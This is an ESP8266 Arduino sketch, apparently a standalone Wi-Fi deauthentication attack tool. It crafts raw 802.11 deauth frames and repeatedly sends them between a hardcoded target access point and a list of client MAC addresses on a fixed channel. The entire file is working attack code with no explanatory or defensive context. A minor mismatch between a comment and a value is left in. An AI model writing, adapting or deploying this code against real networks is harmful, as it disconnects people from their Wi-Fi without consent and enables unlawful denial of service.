//specified channel and ap
#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

const byte cno = 2; //number of target clinets as following listed
const byte wchannel = 1; //target channel
uint8_t ap[6] = {0xA4, 0x99, 0x47, 0x4C, 0xDB, 0xC3}; //target access point
uint8_t client [cno][6] = { //target client
                            // insert in this format {0x8C,0x00,0x6D,0x5F,0xF7,0x2C},
                          };
uint8_t packet[26] = { //deauth frame sample
  /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
  /*  4 - 9  */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,//reciever (target)
  /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //source (ap)
  /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
  /* 24 - 25 */ 0x07, 0x00, //reason code (1 = unspecified reason)
};

uint16_t deauth(uint8_t *clients, uint8_t *aps)
{
    int i=0;
    for (i=0; i<6; i++) packet[i+4] = clients[i];
    for (i=0; i<6; i++) packet[i+10] = aps[i];
    for (i=0; i<6; i++) packet[i+16] = aps[i];
    wifi_send_pkt_freedom(packet, 26, 0);
}

void setup() {
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(wchannel);
}

void loop() {
  for (int i=0;i<cno;i++) {
    deauth(client[i],ap);
    delay(100);
    deauth(ap,client[i]);
    delay(100);
  }
}
